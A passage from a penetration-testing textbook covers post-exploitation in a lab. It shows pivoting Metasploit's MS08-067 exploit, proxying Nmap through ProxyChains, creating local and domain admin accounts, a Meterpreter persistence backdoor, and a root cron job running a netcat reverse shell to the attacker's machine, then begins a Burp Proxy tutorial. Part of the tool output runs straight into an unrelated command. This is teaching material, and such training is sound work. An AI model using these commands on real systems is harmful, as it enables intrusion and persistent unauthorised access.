--snip--
Listing 13-29: Port scanning with Metasploit
Set the RHOSTS option as usual for auxiliary modules. By default Metasploit
scans port 1-10000 u, though you can change this option if you wish.
Though Metasploit’s port scanners are not as powerful as Nmap’s, we
can at least see that the SMB port is open. From here we might run the
auxiliary/scanner/smb/smb_version module followed by the check function with
the windows/smb/ms08_067_netapi module to lead us toward exploiting the
Windows XP target with the MS08-067 exploit through a pivot.
Running an Exploit through a Pivot
Because our Windows XP and Kali systems are on different networks, a
reverse payload won’t work for our exploit because the Windows XP target
won’t know how to route traffic back to 192.168.20.9. (Of course, if our Kali
system was on the Internet and the internal network we are attacking could
route to the Internet, that would not be the case. However, here our host-
only network does not know how to route to our bridged network.) Instead,
306 Chapter 13
we’ll use a bind payload. Metasploit’s bind handler will have no trouble rout-
ing through the pivot we set up. The windows/meterpreter/bind_tcp payload
will work as shown in Listing 13-30.
msf exploit(handler) > use windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set RHOST 172.16.85.190
RHOST => 172.16.85.190
msf exploit(ms08_067_netapi) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf exploit(ms08_067_netapi) > exploit
Listing 13-30: Exploiting through a pivot
We’ve gotten another session, this time through a pivot.
Socks4a and ProxyChains
Pivoting through Metasploit is all well and good, but we’re limited to using
Metasploit modules. Perhaps there is a way to proxy other tools through
Metasploit’s pivot? In fact there is: using the ProxyChains tool (which
redirects traffic to proxy servers) to send our traffic from other Kali tools
through Metasploit.
But first we need to set up a proxy server in Metasploit. Like the SMB
server module we used to capture NETLM and NETNTLM hashes ear-
lier in this chapter, Metasploit also has a Socks4a proxy server module
(auxiliary/server/socks4a). Listing 13-31 shows how to set up the proxy
server.
msf > use auxiliary/server/socks4a
msf auxiliary(socks4a) > show options
Module options (auxiliary/server/socks4a):
Name Current Setting Required Description
---- --------------- -------- -----------
SRVHOST 0.0.0.0 yes The address to listen on
SRVPORT 1080 yes The port to listen on.
msf auxiliary(socks4a) > exploit
[*] Auxiliary module execution completed
[*] Starting the socks4a proxy server
Listing 13-31: Setting up a Socks4a proxy server in Metasploit
Leave the options as the defaults, but note that the server will be listen-
ing on port 1080.
Now we need to edit the configuration file for ProxyChains at /etc/
proxychains.conf. Scroll down to the bottom of the file in an editor, and you
should see that by default, ProxyChains is set to route traffic to the Tor net-
work as shown here.
Post Exploitation 307
# add proxy here ...
# defaults set to “tor”
socks4 127.0.0.1 9050
We need to change the proxy value to Metasploit’s listening server.
Replace port 9050 (for Tor) with 1080 (for Metasploit). The line should
now read:
socks4 127.0.0.1 1080
Save the configuration file for ProxyChains. Now we can run tools like
Nmap from outside Metasploit against our Windows XP target, as long as we
preface them with proxychains as shown in Listing 13-32. (The Metasploit
route must still be active because ProxyChains simply redirects the traffic
to Metasploit, which will forward the traffic through the pivot.)
root@kali:~# proxychains nmap -Pn -sT -sV -p 445,446 172.16.85.190
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-25 15:00 EDT
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.85.190.165:445-<><>-OKu
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.85.190:446- net user james password /add
net user james password /add
The command completed successfully.
We should also add our new user to the relevant groups with the com-
mand net localgroup group username /add. For example, if we want to log in
via remote desktop, we should add the user to the Remote Desktop Users
group. The Administrators group is also a good group to add our user to as
shown here.
C:\Documents and Settings\georgia\Desktop> net localgroup Administrators james /add
net localgroup Administrators james /add
The command completed successfully.
If your client has a Windows domain, you can add users to the domain
and add them to domain groups (if you have sufficient privileges) by tack-
ing on /domain at the end of a command. For example, if you are able to steal
a domain administrator’s token, you can use the following commands to
add a domain administrator account, giving you full control of the entire
domain.
C:\Documents and Settings\georgia\Desktop> net user georgia2 password /add /domain
C:\Documents and Settings\georgia\Desktop> net group "Domain Admins" georgia2 /add /domain
On the Linux target, we can use adduser to add a user account. Ideally we
should also add our new user to the sudoers group so we have root privileges.
Post Exploitation 309
Metasploit Persistence
The Meterpreter script persistence automates the creation of a Windows back-
door that will automatically connect back to a Metasploit listener at startup,
login, and so on, based on the options we use when creating it. The options
for the persistence script are shown in Listing 13-33.
meterpreter > run persistence -h
Meterpreter Script for creating a persistent backdoor on a target host.
OPTIONS:
-A Automatically start a matching multi/handler to connect to the agent
-L  Location in target host where to write payload to, if none %TEMP% will be used.
-P  Payload to use, default is windows/meterpreter/reverse_tcp.
-S Automatically start the agent on boot as a service (with SYSTEM privileges)
-T  Alternate executable template to use
-U Automatically start the agent when the User logs on
-X Automatically start the agent when the system boots
-h This help menu
-i  The interval in seconds between each connection attempt
-p  The port on the remote host where Metasploit is listening
-r  The IP of the system running Metasploit listening for the connect back
Listing 13-33: Meterpreter persistence script
As you can see we have a lot of customization options for our persistent
payload. We can have the persistence agent start at boot or when the user
logs in. We can set an interval between attempts to connect to the handler.
We can change where the agent is written on the target system. We can also
specify the remote host and port for the agent to connect back to. We can
even have Metasploit automatically set up a handler to catch the incom-
ing connection. In the process of setting up persistence, Metasploit has to
write the persistence agent to the disk, so Meterpreter is no longer com-
pletely residing in memory at this point. When the persistence agent runs at
startup (-X), a Visual Basic script is uploaded to the %TEMP% folder, and
a registry entry is added to the list of programs to run at startup. When the
persistence agent runs upon login (-U), the process is similar, but the regis-
try entry is set to run at login. When the persistence agent runs as a service
(-S), a Windows system service is created that will call the Visual Basic script
from %TEMP%.
Let’s run the persistence script, as shown in Listing 13-34, telling the
agent to connect back to our Kali machine when the user logs in.
meterpreter > run persistence -r 192.168.20.9 -p 2345 -U
[*] Running Persistence Script
[*] Resource file for cleanup created at /root/.msf4/logs/persistence/BOOKXP_20150814.1154/
BOOKXP_20150814.1154.rc
[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345
[*] Persistent agent script is 614853 bytes long
[+] Persistent Script written to C:\WINDOWS\TEMP\eTuUwezJblFHz.vbs
[*] Executing script C:\WINDOWS\TEMP\eTuUwezJblFHz.vbs
310 Chapter 13
[+] Agent executed with PID 840
[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BJkGfQLhXD
[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\BJkGfQLhXD
Listing 13-34: Running the persistence script
After running the script, place the Meterpreter session in the back-
ground with the Meterpreter command background, and set up a handler
to catch the persistence agent. Now restart the Windows XP target. When
it restarts, log in as georgia, and you should receive another Meterpreter
session.
note If it doesn’t work the first time, try restarting and logging in again.
Creating a Linux cron Job
On both Windows and Linux systems, we can automatically start tasks at
a given time. For example, we can set up a cron job to automatically run a
Metasploit payload or even just use Netcat to connect back to us.
Open /etc/crontab on your Linux target. The following line will run the
command nc 192.168.20.9 12345 -e /bin/bash every ten minutes of every hour
of every day of every month—basically every ten minutes. The command will
be run as root. Add this line to the end of the /etc/crontab file. (For help, see
“Automating Tasks with cron Jobs” on page 72.)
*/10 * * * * root nc 192.168.20.9 12345 -e /bin/bash
Now restart the cron service by entering service cron restart. Set up a
Netcat listener on port 12345 on your Kali machine, and at the next ten-
minute mark, the cron job should run, and you should receive a root shell at
your Netcat listener.
summary
In this chapter we’ve covered just a few post-exploitation techniques, barely
skimming the surface of the wealth of interesting tools and techniques
available. We looked at some methods for escalating our privileges on an
exploited system. We also looked at methods of gathering local informa-
tion. We studied methods of turning access to one system into access to
many, including pivoting from one network to another through an open
session. Finally, we looked at a couple of methods for making our access
permanent.
Post Exploitation 311
14
weB aPPliCation testing
Though automated scanners are great at finding
known vulnerabilities in web applications, many cli-
ents build custom web applications. Sure, commercial
products can automate attacks against user input fields
in custom web applications, but nothing can replace a
good penetration tester with a proxy when it comes to
finding security issues in these applications.
Like all software, web applications may have issues when input is not
properly sanitized. For example, when an application pulls data from a data-
base based on certain user input, the application may expect specific input
such as a username and password. If, instead, the user enters special input
to create additional database queries, he or she may be able to steal data
from the database, bypass authentication, or even execute commands on
the underlying system.
In this chapter we’ll look at finding some common vulnerabilities in web
applications using the example web application installed on the Windows 7
target: a simple bookstore with several security issues frequently found in web
applications. (See “Installing Additional Software” on page 52 for instal-
lation instructions.)
using Burp Proxy
We can use a proxy to capture requests and responses between our browser
and the web application so we can see exactly what data is being transmitted.
Kali Linux comes with the free version of Burp Suite, a testing platform for
web applications that includes a proxy feature. Burp includes other useful
components, such as Burp Spider, which can crawl through web application
content and functionality, and Burp Repeater, which allows you to manipu-
late and resend requests to the server. For now, we’ll focus on the Burp
Proxy tab.
To start Burp Suite in Kali Linux, go to Applications at the top left
of the Kali GUI, and then click Kali Linux4Web Applications4Web
Application Fuzzers4burpsuite, as shown in Figure 14-1.
Figure 14-1: Starting Burp Suite in Kali
Click the Proxy tab, as shown in Figure 14-2. By default, the Intercept
is on button should be selected so that Burp Suite intercepts and traps any
outgoing requests from a web browser configured to use Burp as a proxy
for web traffic. This setting will allow us to see and even modify the details
of web requests before they are sent to the server.
314 Chapter 14
Figure 14-2: Burp Proxy interface
Now we need to tell our browser in Kali Linux to proxy web traffic
through Burp Suite.
1. Open the Iceweasel browser, go to Edit4Preferences4Advanced, and
select the Network tab.
2. Click Settings to the right of Connection.
3. In the Connection Settings dialog, shown in Figure 14-3, select Manual
proxy configuration, and enter the IP address 127.0.0.1 and port 8080.
This tells Iceweasel to proxy traffic through the localhost on port 8080,
the default port for Burp Proxy.
Figure 14-3: Setting a proxy in Iceweasel
Web Application Testing 315
To ensure that Iceweasel will proxy all our traffic through Burp Suite,
browse to the URL bookservice on your Windows 7 target: http://192.168.20.12/
bookservice.
The connection should appear to hang in the browser, and the
browser and Burp Suite should light up as the HTTP GET request for the
main page of the bookservice site is captured by Burp Proxy, as shown in
Figure 14-4.
Figure 14-4: Captured HTTP GET request
We can see the details of the HTTP GET request asking the server for the
bookservice web page.
As we will see later, we can make changes to the request before sending